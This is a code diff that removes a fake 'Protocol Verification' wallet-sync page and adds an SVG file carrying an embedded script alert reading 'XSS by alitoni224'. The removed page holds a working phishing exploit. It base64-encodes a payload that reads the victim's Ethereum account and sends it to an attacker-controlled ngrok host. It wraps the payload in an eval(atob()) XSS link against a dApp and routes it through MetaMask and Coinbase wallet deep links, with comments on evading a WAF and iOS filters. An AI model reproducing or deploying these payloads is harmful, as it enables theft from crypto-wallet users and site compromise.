@@ -1,41 +1,9 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Protocol Verification</title>
-    <style>
-        body { background: #000; color: #f6851b; font-family: sans-serif; text-align: center; padding-top: 20%; }
-        .btn { border: 1px solid #f6851b; padding: 15px 30px; border-radius: 10px; text-decoration: none; color: #f6851b; }
-    </style>
-</head>
-<body>
-    <h2>SECURITY CHALLENGE</h2>
-    <p>Complete the handshake to sync wallet</p><br><br>
-    <a href="#" class="btn" onclick="stealthExploit()">VERIFY CONNECTION</a>
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 
-    <script>
-        function stealthExploit() {
-            // 1. تشفير الـ Payload بـ Base64 لإخفائه عن الـ WAF
-            // الكود الأصلي: alert('Syncing...'); window.ethereum.request({method:'eth_accounts'}).then(a => location.href='https://your-kali.com/log?a='+a[0]);
-            const rawPayload = "alert('Handshake Successful'); if(window.ethereum){window.ethereum.request({method:'eth_accounts'}).then(a => { fetch('https://your-kali-ip.ngrok-free.app/log?address=' + a[0]); });}";
-            const encodedPayload = btoa(rawPayload);
-
-            // 2. بناء رابط يعتمد على فك التشفير ذاتياً (Self-Decoding)
-            // نستخدم 'eval(atob(...))' لتنفيذ الكود المخفي
-            const targetWithXSS = "example-dapp.com/search?q=%3Csvg/onload=eval(atob('" + encodedPayload + "'))%3E";
-
-            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-            
-            if (isIOS) {
-                // تجاوز فلتر iOS عبر Universal Link
-                window.location.href = "https://metamask.app.link/dapp/" + targetWithXSS;
-            } else {
-                // للأندرويد (جهاز Infinix الخاص بك)
-                const cbLink = "https://go.cb-w.com/dapp?url=" + encodeURIComponent("https://" + targetWithXSS);
-                window.location.href = cbLink;
-            }
-        }
-    </script>
-</body>
-</html>
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+  <script type="text/javascript">
+    alert("XSS by alitoni224");
+  </script>
+</svg>
